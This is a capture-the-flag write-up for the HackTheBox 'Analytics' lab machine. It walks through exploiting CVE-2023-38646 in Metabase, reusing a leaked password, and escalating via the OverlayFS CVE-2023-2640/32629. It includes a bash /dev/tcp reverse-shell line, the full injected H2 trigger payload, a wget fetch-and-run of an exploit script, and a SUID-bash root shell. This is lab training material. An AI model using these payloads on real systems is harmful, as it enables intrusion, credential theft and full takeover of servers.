# HackTheBox Analytics

An Easy-level CTF lab machine of the HackTheBox platform running Linux, where we will exploit Pre-Auth RCE in Metabase, take advantage of password reuse, and escalate privileges via a vulnerability in OverlayFS.

## Service Overview

The machine is assigned IP address 10.10.11.233, let's scan the ports with Nmap:

```bash
$ nmap --privileged -sV -sC -sS -p- -oN nmap 10.10.11.233
Nmap scan report for 10.10.11.233
Host is up (0.048s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 701.58 seconds
```

## Web Service

We need to add analytical.htb to /etc/hosts:

```bash
$ sudo nano /etc/hosts
10.10.11.233 analytical.htb
```

The Login link leads to data.analytical.htb, let's also add this domain to /etc/hosts.

We are met by Metabase, which is vulnerable to CVE-2023-38646. Let's use the public exploit and get a reverse shell.

```bash
$ git clone https://github.com/securezeron/CVE-2023-38646
$ cd CVE-2023-38646/
$ pip install -r requirements.txt
```

CVE-2023-38646-Reverse-Shell.py change line to 

```python
    payload = base64.b64encode(f"bash -c 'bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1'".encode()).decode()
```

```bash
$ python3 CVE-2023-38646-Reverse-Shell.py --rhost http://data.analytical.htb --lhost 10.10.16.25 --lport 4444
[DEBUG] Original rhost: http://data.analytical.htb
[DEBUG] Preprocessed rhost: http://data.analytical.htb
[DEBUG] Input Arguments - rhost: http://data.analytical.htb, lhost: 10.10.16.25, lport: 4444
[DEBUG] Fetching setup token from http://data.analytical.htb/api/session/properties...
[DEBUG] Setup Token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
[DEBUG] Version: v0.46.6
[DEBUG] Setup token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
[DEBUG] Payload = YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yNS80NDQ0IDA+JjEn
[DEBUG] Sending request to http://data.analytical.htb/api/setup/validate with headers {'Content-Type': 'application/json'} and data {
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details": {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules": {},
        "details": {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yNS80NDQ0IDA+JjEn}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "test",
        "engine": "h2"
    }
}
[DEBUG] Response received: {"message":"Error creating or initializing trigger \"PWNSHELL\" object, class \"..source..\", cause: \"org.h2.message.DbException: Syntax error in SQL statement \"\"//javascript\\\\000ajava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yNS80NDQ0IDA+JjEn}|{base64,-d}|{bash,-i}')\\\\000a\"\" [42000-212]\"; see root cause for details; SQL statement:\nSET TRACE_LEVEL_SYSTEM_OUT 1 [90043-212]"}
[DEBUG] POST to http://data.analytical.htb/api/setup/validate failed with status code: 400
```

```bash
$ nc -lnvp 4444
listening on [any] 4444 ...
id
id
connect to [10.10.16.25] from (UNKNOWN) [10.10.11.233] 39474
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
7b5bccd56741:/$ id
id
uid=2000(metabase) gid=2000(metabase) groups=2000(metabase),2000(metabase)
7b5bccd56741:/$ ls -al
ls -al
total 92
drwxr-xr-x    1 root     root          4096 Oct 13 12:29 .
drwxr-xr-x    1 root     root          4096 Oct 13 12:29 ..
-rwxr-xr-x    1 root     root             0 Oct 13 12:29 .dockerenv
drwxr-xr-x    1 root     root          4096 Jun 29 20:40 app
drwxr-xr-x    1 root     root          4096 Jun 29 20:39 bin
drwxr-xr-x    5 root     root           340 Oct 13 12:29 dev
drwxr-xr-x    1 root     root          4096 Oct 13 12:29 etc
drwxr-xr-x    1 root     root          4096 Aug  3 12:16 home
drwxr-xr-x    1 root     root          4096 Jun 14 15:03 lib
drwxr-xr-x    5 root     root          4096 Jun 14 15:03 media
drwxr-xr-x    1 metabase metabase      4096 Aug  3 12:17 metabase.db
drwxr-xr-x    2 root     root          4096 Jun 14 15:03 mnt
drwxr-xr-x    1 root     root          4096 Jun 15 05:12 opt
drwxrwxrwx    1 root     root          4096 Aug  7 11:10 plugins
dr-xr-xr-x 4323 root     root             0 Oct 13 12:29 proc
drwx------    1 root     root          4096 Aug  3 12:26 root
drwxr-xr-x    2 root     root          4096 Jun 14 15:03 run
drwxr-xr-x    2 root     root          4096 Jun 14 15:03 sbin
drwxr-xr-x    2 root     root          4096 Jun 14 15:03 srv
dr-xr-xr-x   13 root     root             0 Oct 13 12:29 sys
drwxrwxrwt    1 root     root          4096 Oct 13 13:05 tmp
drwxr-xr-x    1 root     root          4096 Jun 29 20:39 usr
drwxr-xr-x    1 root     root          4096 Jun 14 15:03 var

Right away, we'll look in the environment variables and find the creds.

7b5bccd56741:/$ env
env
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=7b5bccd56741
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=5
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
```

Trying to connect to SSH with these creds:

```bash
$ ssh metalytics@10.10.11.233
An4lytics_ds20223#
```

```bash
$ ssh metalytics@10.10.11.233
The authenticity of host '10.10.11.233 (10.10.11.233)' can't be established.
ECDSA key fingerprint is SHA256:/GPlBWttNcxd3ra0zTlmXrcsc1JM6jwKYH5Bo5qE5DM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.233' (ECDSA) to the list of known hosts.
metalytics@10.10.11.233's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct 13 01:13:06 PM UTC 2023

  System load:              0.3544921875
  Usage of /:               95.5% of 7.78GB
  Memory usage:             46%
  Swap usage:               0%
  Processes:                4231
  Users logged in:          1
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.10.11.233
  IPv6 address for eth0:    dead:beef::250:56ff:feb9:c539

  => / is using 95.5% of 7.78GB
  => There are 4060 zombie processes.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Oct 13 13:36:00 2023 from 10.10.16.93
ELF: command not found
metalytics@analytics:~$ ls
l  linpeas.sh  m  u  user.txt  w
metalytics@analytics:~$ cat user.txt
0668eff9398a8978dc2a4b19b6d46c2f
metalytics@analytics:~$
```

## Privilege escalation

Let's take advantage of CVE-2023-2640 and CVE-2023-32629 and elevate privileges.

```bash
$ git clone https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629.git
$ cd CVE-2023-2640-CVE-2023-32629/
$ python3 -m http.server 8081
```

```bash
metalytics@analytics:~$ wget 10.10.16.25:8081/exploit.sh
metalytics@analytics:~$ chmod +x exploit.sh
metalytics@analytics:~$ ./exploit.sh
[+] You should be root now
[+] Type 'exit' to finish and leave the house cleaned

metalytics@analytics:~$ find / -type f -perm -4000 2>/dev/null
/var/tmp/bash
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
metalytics@analytics:~$ /var/tmp/bash -p
bash-5.1# id
uid=1000(metalytics) gid=1000(metalytics) euid=0(root) groups=1000(metalytics)
bash-5.1# ls
l  linpeas.sh  lp.output.txt  m  u  user.txt  w
bash-5.1# cd /root
bash-5.1# ls
root.txt
bash-5.1# cat root.txt
bc75489bf52306f08d2ee8f646788d50
bash-5.1#
```